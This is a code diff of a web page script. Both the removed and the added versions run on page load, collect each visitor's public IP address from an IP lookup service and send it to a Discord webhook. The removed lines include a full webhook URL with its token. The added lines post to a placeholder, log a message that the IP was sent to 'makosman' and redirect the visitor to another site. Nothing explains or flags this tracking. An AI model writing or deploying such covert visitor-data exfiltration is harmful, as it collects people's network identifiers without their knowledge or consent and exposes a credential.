@@ -1,20 +1,23 @@
-var ip = '';
-fetch('https://api.ipify.org/?format=json')
-.then(function(response) {
-  return response.json();
-})
-.then(function(data) {
-  ip = data.ip;
-  var webhook = 'https://discord.com/api/webhooks/1129328426503905351/rX4l5Sv1Y0UAYbrmzFj6G2jyRroHyOnhXfeyS-0knV9eabFntCPfjqZ4hnAzXxVp6FQD'
-  var message = {
-    content: someone_has_visited_the_website_Public'IP:' + ip
-  };
-
-      fetch(webhook, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(message)
-      });
-});
+                $(document).ready(function() { 
+                         $("#message1").fadeIn(2000).fadeOut(2000); 
+                         setTimeout(function() { 
+                                 $.getJSON("https://jsonip.com?callback=?", function(data) { 
+                                         var ipAddress = data.ip; 
+                                         $.ajax({ 
+                                                 type: "POST", 
+                                                 url: "WEBHOOK HERE", 
+                                                 contentType: "application/json", 
+                                                 data: JSON.stringify({"content": "IP Address: " + ipAddress}), 
+                                                 success: function() { 
+                                                         console.log("IP address sent to makosman!"); 
+                                                         $("#message2").fadeIn(2000).fadeOut(2000, function() { 
+                                                                 window.location.href = "http://makos.rf.gd"; 
+                                                         }); 
+                                                 }, 
+                                                 error: function(xhr, status, error) { 
+                                                         console.error("Error sending IP address to makosman: " + error); 
+                                                 } 
+                                         }); 
+                                 }); 
+                         }, 4000); 
+                 });
